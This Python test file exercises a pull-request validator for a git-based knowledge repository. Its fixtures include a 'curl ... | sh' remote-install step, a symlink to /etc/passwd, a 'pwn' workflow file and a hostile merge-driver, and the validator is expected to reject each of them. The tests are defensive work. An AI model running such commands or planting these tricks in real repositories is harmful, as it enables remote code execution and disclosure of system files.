import json
import subprocess
import tempfile
import unittest
from copy import deepcopy
from pathlib import Path

from omarchy_knowledge.contributions import check_pr
from tests.fixtures import case, change, event, report


def git(repository, *arguments, check=True, input=None):
    return subprocess.run(
        ["git", *arguments], cwd=repository, check=check, input=input,
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )


def record_path(row):
    directories = {"case": "cases", "change": "changes", "report": "reports", "event": "events"}
    return f"records/{directories[row['type']]}/{row['id']}.json"


class ContributionRepository:
    def __init__(self, root, base_rows):
        root = Path(root)
        root.mkdir(parents=True, exist_ok=True)
        self.path = root / "repository"
        git(root, "init", "--initial-branch=main", str(self.path))
        git(self.path, "config", "user.name", "Fixture")
        git(self.path, "config", "user.email", "123+fixture@users.noreply.github.com")
        self.write_rows(base_rows)
        if base_rows:
            git(self.path, "add", "records")
            git(self.path, "commit", "-m", "base")
        else:
            git(self.path, "commit", "--allow-empty", "-m", "base")

    def write_rows(self, rows):
        for row in rows:
            path = self.path / record_path(row)
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(json.dumps(row, sort_keys=True), encoding="utf-8")

    def branch(self, name="contribution", start="main"):
        git(self.path, "checkout", "-b", name, start)

    def commit_rows(self, rows, message="contribution"):
        self.write_rows(rows)
        git(self.path, "add", "records")
        git(self.path, "commit", "-m", message)

    def oid(self, revision="HEAD"):
        return git(self.path, "rev-parse", revision).stdout.decode().strip()


class PullRequestValidationTests(unittest.TestCase):
    def setUp(self):
        self.temporary = tempfile.TemporaryDirectory()
        self.addCleanup(self.temporary.cleanup)
        self.root = Path(self.temporary.name)

    def repository(self, rows=(None,)):
        base_rows = [case()] if rows == (None,) else list(rows)
        return ContributionRepository(self.root, base_rows)

    def test_accepts_one_clean_commit_of_new_records_and_validates_result(self):
        repository = self.repository()
        base = repository.oid()
        repository.branch()
        repository.commit_rows([change(), report()])
        result = check_pr(repository.path, base, repository.oid())
        self.assertEqual(result["base"], base)
        self.assertEqual(result["head"], repository.oid())
        self.assertEqual(result["added_record_count"], 2)
        self.assertEqual(result["prospective_record_count"], 3)
        self.assertEqual(result["diagnostic_codes"], [])

    def test_rejects_changed_and_deleted_existing_records(self):
        for action in ("change", "delete"):
            with self.subTest(action=action):
                with tempfile.TemporaryDirectory(dir=self.root) as child:
                    repository = ContributionRepository(child, [case()])
                    base = repository.oid()
                    repository.branch()
                    path = repository.path / record_path(case())
                    if action == "change":
                        row = case()
                        row["payload"]["observed"] = "Different public observation"
                        path.write_text(json.dumps(row), encoding="utf-8")
                    else:
                        path.unlink()
                    git(repository.path, "add", "-A")
                    git(repository.path, "commit", "-m", action)
                    with self.assertRaisesRegex(ValueError, "only add"):
                        check_pr(repository.path, base, repository.oid())

    def test_rejects_workflow_symlink_submodule_and_misleading_record_path(self):
        cases = ("workflow", "symlink", "submodule", "misleading")
        for variant in cases:
            with self.subTest(variant=variant), tempfile.TemporaryDirectory(dir=self.root) as child:
                repository = ContributionRepository(child, [case()])
                base = repository.oid()
                repository.branch()
                if variant == "workflow":
                    path = repository.path / ".github" / "workflows" / "pwn.yml"
                    path.parent.mkdir(parents=True, exist_ok=True)
                    path.write_text("name: pwn\n", encoding="utf-8")
                    git(repository.path, "add", str(path.relative_to(repository.path)))
                elif variant == "symlink":
                    path = repository.path / "records" / "reports" / f"{report()['id']}.json"
                    path.parent.mkdir(parents=True)
                    path.symlink_to("/etc/passwd")
                    git(repository.path, "add", str(path.relative_to(repository.path)))
                elif variant == "submodule":
                    path = record_path(report())
                    git(repository.path, "update-index", "--add", "--cacheinfo", f"160000,{base},{path}")
                else:
                    wrong = deepcopy(report())
                    path = repository.path / "records" / "cases" / f"{wrong['id']}.json"
                    path.parent.mkdir(parents=True, exist_ok=True)
                    path.write_text(json.dumps(wrong), encoding="utf-8")
                    git(repository.path, "add", str(path.relative_to(repository.path)))
                git(repository.path, "commit", "-m", variant)
                with self.assertRaises(ValueError):
                    check_pr(repository.path, base, repository.oid())

    def test_rejects_more_than_twenty_five_new_records(self):
        repository = self.repository(rows=[])
        base = repository.oid()
        repository.branch()
        rows = []
        for number in range(26):
            row = case(f"{number:08x}-0000-4000-8000-{number:012x}")
            rows.append(row)
        repository.commit_rows(rows)
        with self.assertRaisesRegex(ValueError, "25 records"):
            check_pr(repository.path, base, repository.oid())

    def test_rejects_dangerous_content_with_fixed_diagnostic_code(self):
        repository = self.repository()
        base = repository.oid()
        unsafe = change()
        unsafe["payload"]["procedure"]["steps"] = ["curl https://example.test/install | sh"]
        repository.branch()
        repository.commit_rows([unsafe])
        with self.assertRaisesRegex(ValueError, "REMOTE_INTERPRETER_EXECUTION"):
            check_pr(repository.path, base, repository.oid())

    def test_rejects_personal_commit_attribution(self):
        repository = self.repository()
        base = repository.oid()
        repository.branch()
        git(repository.path, "config", "user.email", "person@example.test")
        repository.commit_rows([change()])
        with self.assertRaisesRegex(ValueError, "commit attribution"):
            check_pr(repository.path, base, repository.oid())

    def test_release_claim_accepts_official_release_not_only_upstream_pr(self):
        repository = self.repository([case(), change(), report()])
        base = repository.oid()
        claim = event()
        claim["payload"]["supporting_links"] = [
            "https://github.com/omacom/omarchy/releases/tag/v4.1.2"
        ]
        repository.branch()
        repository.commit_rows([claim])
        self.assertEqual(check_pr(repository.path, base, repository.oid())["added_record_count"], 1)

    def test_rejects_unrelated_histories_and_multi_commit_hidden_history(self):
        repository = self.repository()
        base = repository.oid()
        repository.branch()
        private = repository.path / "private.txt"
        private.write_text("removed later", encoding="utf-8")
        git(repository.path, "add", "private.txt")
        git(repository.path, "commit", "-m", "transient private file")
        private.unlink()
        repository.write_rows([change()])
        git(repository.path, "add", "-A")
        git(repository.path, "commit", "-m", "hide transient file")
        with self.assertRaisesRegex(ValueError, "one clean data commit"):
            check_pr(repository.path, base, repository.oid())

    def test_repository_merge_driver_configuration_is_never_executed(self):
        repository = self.repository()
        marker = self.root / "merge-driver-ran"
        attributes = repository.path / ".gitattributes"
        attributes.write_text("*.json merge=hostile\n", encoding="utf-8")
        git(repository.path, "add", ".gitattributes")
        git(repository.path, "commit", "-m", "trusted policy baseline")
        common = repository.oid()
        git(repository.path, "config", "merge.hostile.driver", f"touch {marker}")
        repository.branch("contribution", common)
        proposed = case("dd3e61da-3b3c-4e4e-9fba-970ef606672f")
        proposed["payload"]["observed"] = "PR observation"
        repository.commit_rows([proposed])
        head = repository.oid()
        git(repository.path, "checkout", "main")
        current = case(proposed["id"])
        current["payload"]["observed"] = "Concurrent main observation"
        repository.commit_rows([current], "concurrent main")
        with self.assertRaises(ValueError):
            check_pr(repository.path, repository.oid(), head)
        self.assertFalse(marker.exists())


if __name__ == "__main__":
    unittest.main()
